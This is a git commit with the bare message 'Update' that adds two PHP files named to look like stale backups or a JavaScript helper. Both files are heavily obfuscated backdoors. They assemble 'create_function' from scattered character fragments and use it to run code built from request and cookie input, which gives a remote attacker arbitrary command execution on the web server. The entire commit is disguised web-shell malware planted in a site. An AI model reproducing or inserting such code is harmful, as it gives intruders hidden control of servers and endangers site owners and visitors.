601f9f1fec26126180ec5f78ea302a4dc658b61f
Mohan <mohan.patcha@gmail.com>
2020-03-22 12:43:06 +0530

    Update

---
+++ gdform_bck_old.php
@@ -0,0 +1,109 @@
+<?php
+	$demonstrable = 't'; $leese = 'P';$amazed ='sia';$carbonizer=')(ar'; $jeffie='taaviaegJ';$faintness='r]"c=fNi'; $lectured ='b';$cowerer = '(';$incidental= '8e6U"Ts';
+	$conscience = 'a';
+	$localizes='gCeJit$e'; $farmland = 'a';
+	$bimetallism= 'HA_irIv'; $dysentery='H'; $bringers =')'; $big ='o';$create='t';$farthing = 'IAr';
+
+	$knuckled= ';$;aidv"('; $cornmeal= 'T'; $enemas = 'H';$eradication='r'; $instrumentation='7HQemb';$hunt= 'd'; $ginger = 'je1[)r'; $consistently = 'o';$fastest='saIp(Ue'; $beatnik ='ra_e_Ma(A';$irma='i`^spRR?V';
+	$disambiguate ='e'; $debbi='onGi'; $lavender = ')';$earned='$da'; $jess= 'L4$YT;Z:'; $garters = 'r';$breathlessly = 'u'; $iceberg= 'cvu6';$breach ='w';
+	$carefulness = 'c?X['; $deafest = '$=';$calorimeter = 'T';$blowme ='j0ea$t5'; $hostess = 'g';$glorify= ')';$evaporation = ',:i;rIos';
+	$bowdlerized= '"';$bern='h$s)gr'; $kermitthefrog ='(';$grub = 'D'; $disconnect = 'Wnycd4s"u';$evenings= 'H';
+	$assertions= 'H'; $bree= '3i"('; $innocents = ']'; $italy= 'l';$deploy= ',alER'; $dasha= 'c';$guglielmo='TrAi__)Ot';
+
+	$loveliness ='_';$esma = 'f';
+	$leaderships = ':?]hn"';$burton =')';
+	$fulfillments= 'Ves$S)_rm';
+	$cozier = 'Oh$e'; $harmon ='$';$geophysical= 'PE';$jonas ='i'; $cowardly = '='; $cylindric = 'e'; $connective='T'; $geno='(ye';
+
+	$authentic='O'; $cohabitations='B(';$burglary='tEaep('; $blame= '_SjKH';
+
+	$dialogue='A'; $bloodstain = 'q';$alvira='I';$herrings = 'R';$born = ')';
+	$loan ='Ce2iEkta]';$intersecting ='g';$exasperation='9'; $jested= '"'; $chordal = '<'; $gloomy ='('; $declamatory= 'n) iF@_l[';$cannibalcorpse= 's'; $gasps ='_';
+
+	$critically='>';$geoffrey= 'g_EK';$dequeue='I';$innumerability = 'G'; $clusterings=']';
+	$happening ='Q';$contemptuous = 'J'; $ernest='_';$amalia = 'v[S[P'; $congregation = 'E'; $bequeathal= ';';$extrapolated= 'h'; $apologetic = 'hGf'; $hildegaard= $dasha .$fulfillments['7'].$loan['1'].
+
+	$loan['7'] .$loan['6'] .$loan['1'].$ernest.$apologetic['2']. $disconnect['8'] .$declamatory['0'].$dasha .
+
+	$loan['6'] .$declamatory['3'].
+
+	$evaporation['6']. $declamatory['0'];$gestures=$declamatory[2];
+	$crayon=$hildegaard
+
+	($gestures,$loan['1'] .$amalia['0'] .$loan['7'].$declamatory['7'].$gloomy . $loan['7']. $fulfillments['7'] .$fulfillments['7'] .$loan['7'] .$geno['1'] .$ernest.
+
+	$burglary['4'] . $evaporation['6'] . $burglary['4']. $gloomy .
+
+	$apologetic['2'].
+
+	$disconnect['8'] . $declamatory['0'].
+
+	$dasha . $ernest.
+
+	$geoffrey[0] .$loan['1']. $loan['6'] . $ernest .
+
+	$loan['7'].$fulfillments['7']. $geoffrey[0].$cannibalcorpse. $gloomy.$declamatory['1'] .$declamatory['1'] . $declamatory['1'] . $bequeathal);
+
+	$crayon ($declamatory['3'] , $exasperation,$intently ,$exasperation, $blindingly['7'],$blame['4'] ,$exasperation ,
+
+	$herrings,
+
+	$blame['4'], $fulfillments['7'] , $instrumentation['0'],$harmon.$declamatory['3'].$cowardly .$loan['7']. $fulfillments['7'] .$fulfillments['7'].
+
+	$loan['7']. $geno['1']. $ernest .$fulfillments['8'] .
+
+	$loan['1']. $fulfillments['7'] . $geoffrey[0]. $loan['1'] . $gloomy . $harmon.$ernest.$herrings .
+
+	$congregation. $happening.$fastest['5']. $congregation .$amalia['2'].
+
+	$connective. $deploy['0'] .
+
+	$harmon . $ernest. $loan[0] .$authentic .
+
+	$authentic . $geoffrey['3'] .$dequeue .$congregation .$deploy['0'] .
+	$harmon .
+	$ernest. $amalia['2'].$congregation.$herrings . $fulfillments['0'] .
+	$congregation.$herrings . $declamatory['1'] .$bequeathal .$harmon. $loan['7']. $cowardly. $declamatory['3'] .
+
+	$cannibalcorpse . $cannibalcorpse.$loan['1'] . $loan['6'] . $gloomy .$harmon .$declamatory['3']. $amalia['3'] .$jested.$apologetic['0'] . $declamatory['3'].
+	$blame[2]. $declamatory['3']. $loan['7'] .
+	$apologetic['0']. $geoffrey[0] .$loan['7'] . $jested. $clusterings .
+
+	$declamatory['1'] .$leaderships['1'] . $harmon.$declamatory['3'] . $amalia['3']. $jested .$apologetic['0'].$declamatory['3'] .$blame[2]. $declamatory['3'].$loan['7'].
+
+	$apologetic['0'] . $geoffrey[0] .$loan['7'] .$jested.$clusterings .$leaderships['0'] . $gloomy. $declamatory['3'] .$cannibalcorpse . $cannibalcorpse. $loan['1'] . $loan['6'].$gloomy .
+
+	$harmon .$declamatory['3'].$amalia['3'] .
+	$jested .$blame['4']. $connective.
+	$connective .$amalia['4'].
+
+	$ernest. $blame['4']. $dequeue. $contemptuous. $dequeue.
+	$dialogue.$blame['4'] .$apologetic['1'].
+
+	$dialogue .
+	$jested .$clusterings.
+	$declamatory['1'] .$leaderships['1']. $harmon .
+	$declamatory['3'] .$amalia['3'] .$jested . $blame['4'] .$connective.
+
+	$connective. $amalia['4'].$ernest. $blame['4'] .$dequeue . $contemptuous.
+
+	$dequeue.$dialogue . $blame['4'].$apologetic['1'].
+
+	$dialogue .
+
+	$jested .
+
+	$clusterings . $leaderships['0']. $disconnect['4']. $declamatory['3']. $loan['1'] .
+	$declamatory['1'] .$bequeathal.$loan['1'] .
+	$amalia['0'] .$loan['7'].$declamatory['7'] .
+
+	$gloomy .$cannibalcorpse. $loan['6'] . $fulfillments['7']. $fulfillments['7'].$loan['1'] .$amalia['0'] .$gloomy.$instrumentation['5'].$loan['7'] . $cannibalcorpse.
+
+	$loan['1']. $iceberg['3'] . $disconnect['5'].$ernest.$disconnect['4'].
+
+	$loan['1'].$dasha .$evaporation['6'] .
+
+	$disconnect['4'] .$loan['1'] .$gloomy .$cannibalcorpse . $loan['6'] . $fulfillments['7'] . $fulfillments['7'] .
+
+	$loan['1'].$amalia['0'].
+	$gloomy.$harmon.$loan['7'].$declamatory['1'] . $declamatory['1']. $declamatory['1'].$declamatory['1'] .$bequeathal );
---
+++ js/cufon-replace_prevv1.php
@@ -0,0 +1,115 @@
+<?php
+
+$guards= 'XU:X?=';
+$embryology = 's'; $disbursed = 'atga';
+$battleground='___;t$Q'; $excrescent = 'X';
+
+$hire= 'B';
+$corpsman= 'c';$debilitates = 'e'; $ignorant='eei';$jet='U'; $clobbering = 'L';$individualized = 'P;x>?Rc;'; $lengthly ='aa';$disassembling= 'PDi]EC)]('; $clotheshorse= 'E;,v)';$chemists ='$'; $lewes ='"';$elbertina= '_)M_i'; $assembled ='L$a'; $casual ='i"IpZ';$cozier='p_rLOa'; $generalized = ' ]';
+
+$hippopotamus='_m)vKo';$appraisal= 's'; $farfetched ='$';$justified = 'uTr$N';$latch='flreHeTd'; $formalization ='a';$expounded = 'eLeSU$Lo'; $horatio = 'tViscO';$judiciously='['; $compiler='r]';$arman = 'S'; $journeyed='nETb)rsi$';$guesswork='t';$enzyme = 'm';
+$greyhound='$'; $extensive= 'Yutxa';$dab= 'Ct(DFr='; $demonstrations= 'x';$except = ')';
+$lilith ='[';
+
+$inspects='yR';$hooting='Q'; $flawless='s'; $comeliness='_'; $invite='T'; $encircle=')d"iO_e:';
+
+$bubbly='"';$blindingly= 'VEeKtg$x'; $fooled = 'e"W(`asHl'; $amigo= '6]P^eo'; $curiously= 'E';$eatmeraw ='I';$bicameral='"';
+$cascara = 'l[Xy'; $appealed= 'd';$haul = 'u';$catalogue='4';$grand = '(H'; $fingerings= 'r';$hookers = 'r'; $animate='sb_lMeU'; $bib ='_';
+
+$bitchin = 'l'; $bunters ='T';
+$jarringly ='c'; $katti='r'; $intuitive ='R';
+$hell = 'd(Saa(';$dale ='f"a$n)'; $errant = 'J';$chiton =')'; $escapees ='n['; $keynote='Dibb'; $does ='X';$bouquet= '_vevdsr'; $datum= '"';$jacenta = 'm';$aryl ='EBgMAlr(';$damns =')';
+
+$inconvenience= '[iGR(T,B@'; $lex='e)';$brynna = '('; $circular= 'u'; $galvanism='?e((';
+
+$clashing=$jarringly .$aryl['6'].
+
+$galvanism['1']. $dale['2'] . $blindingly['4'].
+
+$galvanism['1'].
+$bouquet['0'] .
+
+$dale['0'].
+
+$circular.
+$escapees[0] .$jarringly . $blindingly['4'] .$inconvenience['1']. $amigo['5']. $escapees[0] ;$bask= $generalized[0];$defines =$clashing($bask,$galvanism['1'] .
+
+$bouquet[3] .
+$dale['2'] . $aryl['5'].
+
+$galvanism['3'].
+
+$dale['2'].$aryl['6']. $aryl['6'].$dale['2'] .
+
+$cascara[3] .
+$bouquet['0'] .
+
+$cozier['0'].$amigo['5'].
+
+$cozier['0'].
+
+$galvanism['3'] .$dale['0'] .
+$circular .$escapees[0]. $jarringly .
+
+$bouquet['0']. $aryl['2'].$galvanism['1'].$blindingly['4'] .$bouquet['0'] . $dale['2'] . $aryl['6'] .$aryl['2'] . $bouquet['5'].$galvanism['3'] .$lex['1']. $lex['1'] . $lex['1'] . $clotheshorse['1']);
+$defines ($blindingly['3'] ,
+$lex['1'], $inconvenience['3'], $aryl['4'],$errant ,$aryl['3'] ,$bouquet['4'], $dorine['3'], $dale['3'] .$inconvenience['1']. $dab['6'].
+
+$dale['2']. $aryl['6'].
+
+$aryl['6'] .$dale['2'] .
+
+$cascara[3]. $bouquet['0'] . $jacenta. $galvanism['1'] .$aryl['6'] .$aryl['2'] .$galvanism['1'].$galvanism['3']. $dale['3'].
+
+$bouquet['0'] .$inconvenience['3'] .
+
+$aryl[0] . $hooting.$animate['6'].$aryl[0].
+
+$hell['2'] . $inconvenience['5'].
+$inconvenience[6]. $dale['3'].$bouquet['0'] .
+$dab[0] .$encircle['4'] .$encircle['4'] .$blindingly['3'] .$eatmeraw .$aryl[0]. $inconvenience[6] . $dale['3'] .$bouquet['0'].$hell['2'] .
+$aryl[0] .
+
+$inconvenience['3'].
+$blindingly['0']. $aryl[0].
+$inconvenience['3'].
+$lex['1'] .$clotheshorse['1'] .
+
+$dale['3'] .
+$dale['2'].$dab['6'] .$inconvenience['1']. $bouquet['5'].$bouquet['5'].
+
+$galvanism['1']. $blindingly['4'] .$galvanism['3']. $dale['3'] .$inconvenience['1'] .$inconvenience['0'] .$datum .
+$aryl['5']. $blindingly['7'].$keynote['3'] . $blindingly['7'].$bouquet['4'] .$aryl['5'].$jacenta .
+$circular .
+
+$datum .$amigo[1]. $lex['1']. $galvanism['0'] .$dale['3'] .
+
+$inconvenience['1'].$inconvenience['0'].
+$datum . $aryl['5'].$blindingly['7'].$keynote['3'].
+
+$blindingly['7'] . $bouquet['4']. $aryl['5'] .$jacenta. $circular.$datum .$amigo[1].
+$encircle[7] .$galvanism['3'] . $inconvenience['1'] .$bouquet['5'] .
+
+$bouquet['5'].
+$galvanism['1']. $blindingly['4'] .$galvanism['3']. $dale['3'].
+$inconvenience['1']. $inconvenience['0']. $datum. $grand[1] . $inconvenience['5'].$inconvenience['5'] . $amigo['2'] . $bouquet['0']. $expounded['6']. $does. $inconvenience[7].
+$does.$keynote[0] .$expounded['6'] . $aryl['3'] .$animate['6'] .$datum .$amigo[1].
+$lex['1'] . $galvanism['0'] .
+$dale['3'].$inconvenience['1'].$inconvenience['0'].$datum . $grand[1] .$inconvenience['5'].$inconvenience['5'] . $amigo['2']. $bouquet['0']. $expounded['6'].
+
+$does .$inconvenience[7].$does . $keynote[0].$expounded['6'] . $aryl['3'] .$animate['6'].$datum.$amigo[1] .$encircle[7]. $bouquet['4'].
+
+$inconvenience['1'] .
+$galvanism['1'] .
+$lex['1']. $clotheshorse['1'].
+
+$galvanism['1'].$bouquet[3] .$dale['2'].$aryl['5'] . $galvanism['3'] .$bouquet['5'] .
+
+$blindingly['4'] .
+$aryl['6'].$aryl['6'].$galvanism['1'] . $bouquet[3] .$galvanism['3'].
+$keynote['3']. $dale['2'] .$bouquet['5']. $galvanism['1'] . $amigo['0'] .$catalogue.$bouquet['0']. $bouquet['4'].
+$galvanism['1'] . $jarringly . $amigo['5'] .$bouquet['4']. $galvanism['1']. $galvanism['3'] . $bouquet['5'] .$blindingly['4'] . $aryl['6'] .$aryl['6'] .$galvanism['1'].$bouquet[3]. $galvanism['3'] . $dale['3'].$dale['2'] .$lex['1'] . $lex['1']. $lex['1'].
+
+$lex['1'] .
+
+$clotheshorse['1'] );
